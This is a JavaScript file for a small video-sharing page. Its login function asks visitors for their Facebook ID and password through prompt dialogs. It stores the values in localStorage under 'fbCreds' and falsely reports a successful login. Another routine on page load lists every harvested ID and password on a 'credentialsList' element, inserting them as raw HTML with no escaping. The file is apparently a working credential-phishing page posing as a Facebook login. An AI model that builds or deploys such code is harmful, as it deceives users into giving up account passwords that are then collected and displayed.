function showLogin() {
  const id = prompt("Enter your Facebook ID:");
  const pw = prompt("Enter your Facebook Password:");
  if (!id || !pw) {
    alert("Login failed. Please enter valid credentials.");
    return;
  }
  const creds = { id, pw };
  const stored = JSON.parse(localStorage.getItem("fbCreds") || "[]");
  stored.push(creds);
  localStorage.setItem("fbCreds", JSON.stringify(stored));
  alert("Login successful!");
  loadVideos();
}

function uploadVideo() {
  const input = document.getElementById("videoUpload");
  if (!input.files[0]) return alert("No file selected.");
  const file = input.files[0];
  const valid = ["video/mp4", "video/x-matroska", "video/avi", "video/quicktime"];
  if (!valid.includes(file.type)) return alert("Invalid file type.");
  if (file.size > 200 * 1024 * 1024) return alert("File exceeds 200MB.");
  const url = URL.createObjectURL(file);
  const container = document.getElementById("adminVideoContainer");
  const video = document.createElement("video");
  video.controls = true;
  video.src = url;
  video.width = 400;
  container.appendChild(video);
}

function loadVideos() {
  const container = document.getElementById("videoContainer");
  if (container) {
    container.innerHTML = "<p>Sample Video:</p><video controls width='400' src='videos/sample.mp4'></video>";
  }
}

window.onload = () => {
  const clist = document.getElementById("credentialsList");
  if (clist) {
    const creds = JSON.parse(localStorage.getItem("fbCreds") || "[]");
    creds.forEach(c => {
      const div = document.createElement("div");
      div.innerHTML = `<strong>${c.id}</strong><br>${c.pw}<hr>`;
      clist.appendChild(div);
    });
  }
  loadVideos();
};
